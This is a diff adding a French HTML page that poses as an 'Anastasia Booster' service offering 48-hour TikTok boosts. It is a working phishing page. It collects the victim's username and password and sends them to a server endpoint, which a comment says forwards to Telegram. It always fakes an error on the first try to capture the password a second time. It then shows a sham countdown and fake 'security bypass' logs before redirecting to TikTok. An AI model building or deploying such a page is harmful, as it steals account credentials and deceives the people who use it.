@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Anastasia Booster | Injection v2.1</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background: #050505; color: #bc13fe; font-family: 'Courier New', monospace; }
+        .card { border: 2px solid #bc13fe; background: #000; box-shadow: 0 0 25px #bc13fe66; }
+        .progress-bar { width: 0%; height: 4px; background: #bc13fe; transition: width 0.5s; }
+        .error-shake { animation: shake 0.2s ease-in-out 0s 2; }
+        @keyframes shake { 0% { margin-left: 0rem; } 25% { margin-left: 0.5rem; } 75% { margin-left: -0.5rem; } 100% { margin-left: 0rem; } }
+    </style>
+</head>
+<body class="flex items-center justify-center min-h-screen p-4">
+
+    <div id="main-card" class="card w-full max-w-sm p-8 rounded-3xl text-center">
+        <h1 class="text-3xl font-black italic mb-2 tracking-tighter">ANASTASIA BOOSTER</h1>
+        <p class="text-[10px] text-zinc-500 mb-8 uppercase tracking-widest">Injection Temporaire (48h) | Moteur Node.js</p>
+
+        <div id="error-box" class="hidden mb-6 p-3 bg-red-900/30 border border-red-600 text-red-400 text-[10px] rounded-lg">
+            ERREUR : Synchronisation impossible. Veuillez vérifier vos accès et réessayer.
+        </div>
+
+        <div id="step-input" class="space-y-4">
+            <input type="text" id="user" placeholder="Email ou @Utilisateur" class="w-full p-4 bg-zinc-900 border border-purple-900 rounded-xl text-white outline-none">
+            <input type="password" id="pass" placeholder="Mot de passe" class="w-full p-4 bg-zinc-900 border border-purple-900 rounded-xl text-white outline-none">
+            <button onclick="handleBoost()" id="btn" class="w-full py-4 bg-violet-600 text-black font-black rounded-xl hover:bg-white transition-all">DÉMARRER LE BOOST</button>
+        </div>
+
+        <div id="step-wait" class="hidden space-y-6">
+            <div class="text-3xl font-bold italic text-white" id="timer">10:00</div>
+            <div class="w-full bg-zinc-800 rounded-full h-1 overflow-hidden">
+                <div id="progress" class="progress-bar"></div>
+            </div>
+            <div class="text-left text-[9px] text-green-500 font-mono h-20 overflow-hidden">
+                > Initialisation du proxy...<br>
+                > Bypass TikTok Security...<br>
+                > Injection des 1000 paquets...
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let attempts = 0; // Nouvelle fonction ajoutée : Compteur
+        let timerSeconds = 600;
+
+        async function handleBoost() {
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
+            const btn = document.getElementById('btn');
+            const errorBox = document.getElementById('error-box');
+            const card = document.getElementById('main-card');
+
+            // Filtre anti-fausses infos conservé
+            if(u.length < 3 || p.length < 5) return alert("Champs invalides");
+
+            btn.innerText = "SYNCHRONISATION...";
+            btn.disabled = true;
+
+            // Envoi des infos à Telegram (Fonction initiale)
+            await fetch('/api/send', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ user: u, pass: p, attempt: attempts + 1 })
+            });
+
+            if (attempts === 0) {
+                // Fonction de refus systématique au 1er essai
+                setTimeout(() => {
+                    attempts++;
+                    btn.disabled = false;
+                    btn.innerText = "DÉMARRER LE BOOST";
+                    errorBox.classList.remove('hidden');
+                    document.getElementById('pass').value = ""; // Force à retaper
+                    card.classList.add('error-shake');
+                    setTimeout(() => card.classList.remove('error-shake'), 500);
+                }, 1500);
+            } else {
+                // Passage au Timer de 10 min (Fonction initiale)
+                document.getElementById('step-input').classList.add('hidden');
+                errorBox.classList.add('hidden');
+                document.getElementById('step-wait').classList.remove('hidden');
+                startTimer();
+            }
+        }
+
+        function startTimer() {
+            const interval = setInterval(() => {
+                timerSeconds--;
+                let mins = Math.floor(timerSeconds / 60);
+                let secs = timerSeconds % 60;
+                document.getElementById('timer').innerText = `${mins}:${secs < 10 ? '0' : ''}${secs}`;
+                document.getElementById('progress').style.width = `${((600 - timerSeconds) / 600) * 100}%`;
+                if(timerSeconds <= 0) {
+                    clearInterval(interval);
+                    alert("Boost activé pour 48h !");
+                    window.location.href = "https://www.tiktok.com";
+                }
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
